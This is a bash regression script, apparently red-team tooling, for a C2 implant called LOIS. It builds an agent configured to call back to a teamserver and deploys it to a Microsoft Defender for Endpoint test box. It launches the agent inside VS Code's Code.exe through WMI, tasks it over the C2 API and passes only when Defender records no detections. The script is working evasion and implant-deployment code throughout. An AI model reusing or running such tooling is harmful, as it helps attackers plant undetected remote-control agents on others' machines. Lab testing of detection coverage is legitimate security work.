#!/usr/bin/env bash
# gate_mde.sh — one-command MDE regression gate for LOIS (ticket 010).
#
# Pipeline: build (baked) -> scp to the MDE box -> launch via WMI
# (Win32_Process.Create survives ssh teardown; schtasks does NOT work without
# an interactive session) -> wait for registration on the test teamserver ->
# pwd round-trip (ui:false!) -> assert Get-MpThreatDetection empty -> cleanup.
#
# No secrets in the repo — everything sensitive comes from env:
#   LOIS_GATE_API_PASS   teamserver operator password        (required)
#   LOIS_GATE_KEY        loistest listener encrypt_key (hex) (required)
#   LOIS_GATE_BOX        ssh alias of the MDE box            (default dt-mde-test)
#   LOIS_GATE_TS         teamserver tailnet IP               (default 100.107.1.55)
#   LOIS_GATE_TS_SSH     ssh target for the API tunnel       (default root@$TS)
#   LOIS_GATE_TS_KEY     ssh key for the tunnel              (default ~/.ssh/adaptixtest)
#   LOIS_GATE_LPORT      listener port on the teamserver     (default 8444)
#   LOIS_GATE_APIPORT    teamserver mgmt port                (default 8443)
#   LOIS_GATE_LOCAL      local tunnel port                   (default 18443)
set -u
STEP=0
pass() { STEP=$((STEP+1)); echo "[$STEP] PASS  $1"; }
fail() { STEP=$((STEP+1)); echo "[$STEP] FAIL  $1"; echo "$2" >&2; exit 1; }

BOX="${LOIS_GATE_BOX:-dt-mde-test}"
TS="${LOIS_GATE_TS:-100.107.1.55}"
TS_SSH="${LOIS_GATE_TS_SSH:-root@$TS}"
TS_KEY="${LOIS_GATE_TS_KEY:-$HOME/.ssh/adaptixtest}"
LPORT="${LOIS_GATE_LPORT:-8444}"
APIPORT="${LOIS_GATE_APIPORT:-8443}"
LPORT_LOCAL="${LOIS_GATE_LOCAL:-18443}"
[ -n "${LOIS_GATE_API_PASS:-}" ] || fail "env" "LOIS_GATE_API_PASS required"
[ -n "${LOIS_GATE_KEY:-}" ] || fail "env" "LOIS_GATE_KEY required"
BOX_IP="$(ssh -o BatchMode=yes "$BOX" "powershell -NoProfile -Command \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {\$_.InterfaceAlias -like '*Tailscale*'}).IPAddress\"" 2>/dev/null | tr -d '\r')"
[ -n "$BOX_IP" ] || BOX_IP="100.123.227.116"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
NODE="${NODE:-/projects/tools/node/bin/node}"
[ -x "$NODE" ] || NODE="$(command -v node)" || fail "env" "node not found"

# 1. API reachability (start our own tunnel if needed)
TUNNEL_PID=""
if ! curl -sk -m 5 -o /dev/null "https://127.0.0.1:$LPORT_LOCAL/manage/login"; then
  ssh -i "$TS_KEY" -o IdentitiesOnly=yes -o BatchMode=yes -N \
      -L "$LPORT_LOCAL:127.0.0.1:$APIPORT" "$TS_SSH" &
  TUNNEL_PID=$!
  sleep 2
fi
cleanup_tunnel() { [ -n "$TUNNEL_PID" ] && kill "$TUNNEL_PID" 2>/dev/null; }
trap cleanup_tunnel EXIT
curl -sk -m 8 -o /dev/null "https://127.0.0.1:$LPORT_LOCAL/manage/login" \
  || fail "api reachability" "no teamserver API on 127.0.0.1:$LPORT_LOCAL"
pass "api reachability (127.0.0.1:$LPORT_LOCAL)"

TOKEN="$(curl -sk -m 10 -X POST "https://127.0.0.1:$LPORT_LOCAL/manage/login" \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"op\",\"password\":\"$LOIS_GATE_API_PASS\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')" \
  || fail "api login" "no token"
[ -n "$TOKEN" ] || fail "api login" "empty token"
pass "api login"

api() { curl -sk -m 15 "$@" -H "Authorization: Bearer $TOKEN"; }
MAXID_BEFORE="$(api "https://127.0.0.1:$LPORT_LOCAL/manage/agent/list" | python3 -c 'import sys,json; print(max([a["a_id"] for a in json.load(sys.stdin)] + [0]))')"

# 2. bake + build
TMPD="$(mktemp -d)"
trap 'cleanup_tunnel; rm -rf "$TMPD"' EXIT
cat > "$TMPD/bake.json" <<EOF
{"hosts":["$TS:$LPORT"],"ssl":false,"http_method":"POST","uri":"/content.html",
 "hb_header":"X-Request-Id",
 "user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
 "encrypt_key":"$LOIS_GATE_KEY",
 "resp_template":"{\"status\": \"ok\", \"data\": \"<<<PAYLOAD_DATA>>>\",\"metrics\": \"sync\"}",
 "sleep_delay":3,"jitter_delay":0,"agent_id":"auto","debug":false}
EOF
"$NODE" "$ROOT/scripts/build_payload.js" --bake "$TMPD/bake.json" --name gate \
  >"$TMPD/build.log" 2>&1 || fail "build" "$(cat "$TMPD/build.log")"
pass "build ($(stat -c%s "$ROOT/dist/gate.js") bytes, encrypted bake)"

# 3. deploy + launcher (base64 the .cmd — ssh/quoting-proof)
scp -o BatchMode=yes "$ROOT/dist/gate.js" "$BOX:/Users/adaptixtest/gate.js" \
  || fail "scp" "copy failed"
CMDB64="$(printf '@echo off\r\nset ELECTRON_RUN_AS_NODE=1\r\n"C:\\Users\\adaptixtest\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe" C:\\Users\\adaptixtest\\gate.js\r\n' | base64 -w0)"
ssh -o BatchMode=yes "$BOX" "powershell -NoProfile -Command \"[IO.File]::WriteAllBytes('C:\\Users\\adaptixtest\\gate.cmd', [Convert]::FromBase64String('$CMDB64'))\"" \
  || fail "launcher write" ""
pass "deploy ($BOX)"

# 4. WMI launch (survives ssh teardown; do not hold the session open)
ssh -o BatchMode=yes "$BOX" "powershell -NoProfile -Command \"Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='C:\\Users\\adaptixtest\\gate.cmd'} | Out-Null\"" \
  || fail "wmi launch" ""
pass "wmi launch"

# 5. registration (new Code.exe agent from the box, id > prior max)
NEWID=""
for _ in $(seq 1 30); do
  NEWID="$(api "https://127.0.0.1:$LPORT_LOCAL/manage/agent/list" | python3 -c "
import sys,json,time
now=int(time.time())
c=[a for a in json.load(sys.stdin) if a['a_id']>$MAXID_BEFORE and a['a_process']=='Code.exe' and a['a_external_ip']=='$BOX_IP' and now-a['a_last_tick']<20]
print(c[0]['a_id'] if c else '')")"
  [ -n "$NEWID" ] && break
  sleep 2
done
[ -n "$NEWID" ] || fail "registration" "no new Code.exe agent from $BOX_IP within 60s"
pass "registration (agent id $NEWID)"

# 6. pwd round-trip (ui:false — ui:true becomes TASK_TYPE_BROWSER and never shows)
curl -sk -m 15 -X POST "https://127.0.0.1:$LPORT_LOCAL/manage/agent/command/execute" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"id\":$NEWID,\"ui\":false,\"cmdline\":\"pwd\",\"data\":\"{\\\"command\\\":\\\"pwd\\\"}\"}" >/dev/null
ANS=""
for _ in $(seq 1 15); do
  ANS="$(api "https://127.0.0.1:$LPORT_LOCAL/manage/agent/console/list?agent_id=$NEWID" | python3 -c "
import sys,json
done=[i for i in json.load(sys.stdin)['items'] if i['type']==107 and i.get('a_completed') and i.get('a_text')]
print(done[-1]['a_text'][:60] if done else '')")"
  [ -n "$ANS" ] && break
  sleep 2
done
[ -n "$ANS" ] || fail "pwd round-trip" "no console answer on agent $NEWID"
pass "pwd round-trip ($ANS)"

# 7. MDE verdict
MDE="$(ssh -o BatchMode=yes "$BOX" "powershell -NoProfile -Command \"\$d = Get-MpThreatDetection -ErrorAction SilentlyContinue; if (\$d) { 'HIT' } else { 'clean' }\"" | tr -d '\r')"
[ "$MDE" = "clean" ] || fail "MDE" "Get-MpThreatDetection non-empty"
pass "MDE zero detections"

# 8. cleanup (lab box: no legit Code.exe usage — kill all, remove artifacts)
ssh -o BatchMode=yes "$BOX" "powershell -NoProfile -Command \"Get-Process Code -ErrorAction SilentlyContinue | Stop-Process -Force; Remove-Item C:\\Users\\adaptixtest\\gate.js,C:\\Users\\adaptixtest\\gate.cmd -Force -ErrorAction SilentlyContinue\"" >/dev/null
pass "cleanup"

echo
echo "GATE RESULT: PASS ($STEP steps) — build is clear against MDE on $BOX"
